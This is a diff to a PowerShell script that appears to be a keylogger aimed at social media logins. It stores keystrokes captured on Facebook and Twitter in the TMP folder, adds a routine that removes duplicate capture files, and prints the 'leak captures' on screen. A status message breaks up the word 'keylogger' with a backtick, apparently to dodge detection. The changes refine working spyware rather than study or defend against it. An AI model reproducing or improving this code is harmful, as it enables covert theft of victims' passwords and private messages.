@@ -245,7 +245,7 @@ If($Action -iMatch '^(start)$')
                }
 
                write-host "   > key`logger running in background!"
-               Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.LastAccess" -force
+               Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
             }
             Else
             {
@@ -318,13 +318,40 @@ If($Action -iMatch '^(stop)$')
       }
    }
 
-
-   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'.LastAccess'    
+   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'
    If(-not([string]::IsNullOrEmpty($GetLogNames)))
    {
+      ForEach($PreventDuplicate in $GetLogNames)
+      {
+         <#
+         .SYNOPSIS
+            Author: @r00t-3xp10it
+            Helper - Prevent Duplicate Logfiles [AUTO_BACKUP]
+         #>
+         
+         $MbACKuPfILE = (dir $Env:TMP).Name|findstr /C:'AUTO_BACKUP.'
+         if(-not($PreventDuplicate -match '^(AUTO_BACKUP.)'))
+         {
+            ## Compare all logs with AUTO_BACKUP. logfile
+            $diogene = (Get-Content "$Env:TMP\${MbACKuPfILE}")
+            $viriato = (Get-Content "$Env:TMP\${PreventDuplicate}")  
+            If("$viriato" -match "$diogene")
+            {
+               $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter'|findstr /V /C:'AUTO_BACKUP.'
+               break ## Break loop after found two duplicated files = delete AUTO_BACKUP. from [output] table
+            }
+         }
+      }
+
       ForEach($Report in $GetLogNames)
       {
-         ## Extract social media names from extensions
+         <#
+         .SYNOPSIS
+            Author: @r00t-3xp10it
+            Helper - [output] Leak captures OnScreen
+         #>      
+      
+         ## Get social media names from extension
          $SocialSite = ($Report).split('.')[1]
          write-host "`nSocial Media: $SocialSite"      
          write-host "Logfile: $Report"
